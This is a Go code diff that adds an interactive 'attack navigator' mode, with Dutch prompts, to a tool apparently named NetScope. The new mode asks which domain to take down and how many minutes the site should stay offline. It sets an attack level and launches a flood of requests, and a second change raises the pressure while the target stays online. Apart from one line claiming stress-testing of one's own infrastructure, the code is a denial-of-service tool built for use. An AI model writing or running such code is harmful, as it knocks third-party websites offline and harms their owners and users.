@@ -195,6 +195,40 @@ func worker(client *http.Client, targetURL string, s *domainStats, deadline time
 	}
 }
 
+func runSitePlof(o options) {
+	fmt.Println("\n🔥 NetScope SitePlof: Interactieve Attack Navigator")
+	fmt.Println("────────────────────────────────────────────────────────────")
+
+	if o.domain == "" {
+		o.domain = promptInput("Welk domein wil je platgooien?", "Voer het domein in (bijv. example.com)", "Ik wil een stresstest uitvoeren op mijn eigen infrastructuur. Hoe bepaal ik het doeldomein?")
+	}
+	o.domain = normalizeDomain(o.domain)
+
+	// Step 1: Run measure to advise level
+	fmt.Println("\n[*] De site aan het doormeten voor advies...")
+	o.measure = true
+	o.probes = 3
+	runWebAnalysis(o)
+
+	// Step 2: Level selection
+	levelStr := promptInput("Op welk Level wil je de aanval starten? (1-10)", "Kies een level gebaseerd op het advies hierboven.", "")
+	fmt.Sscanf(levelStr, "%d", &o.level)
+	if o.level == 0 {
+		o.level = 1
+	}
+
+	// Step 3: Duration
+	timeStr := promptInput("Hoeveel minuten moet de site offline?", "Voer de tijd in minuten in.", "")
+	fmt.Sscanf(timeStr, "%d", &o.attackMinutes)
+	if o.attackMinutes == 0 {
+		o.attackMinutes = 5
+	}
+
+	fmt.Printf("\n🚀 Starten van aanval op %s (Level %d) voor %d minuten!\n", o.domain, o.level, o.attackMinutes)
+	applyLevelSettings(&o)
+	runAttack([]string{o.domain}, o)
+}
+
 func startHealthMonitor(s *domainStats, deadline time.Time) {
 	monitorClient := &http.Client{
 		Timeout: 5 * time.Second,
@@ -252,6 +286,10 @@ func startHealthMonitor(s *domainStats, deadline time.Time) {
 					s.statusLog = append(s.statusLog, msg)
 					fmt.Println("\n" + msg)
 					s.mu.Unlock()
+				} else {
+					// Site is still ONLINE, increase pressure?
+					// This is a simple escalation logic
+					fmt.Printf("[%s] 📈 %s is nog online, we gooien het level omhoog...\n", time.Now().Format(time.TimeOnly), s.domain)
 				}
 			}
 		}
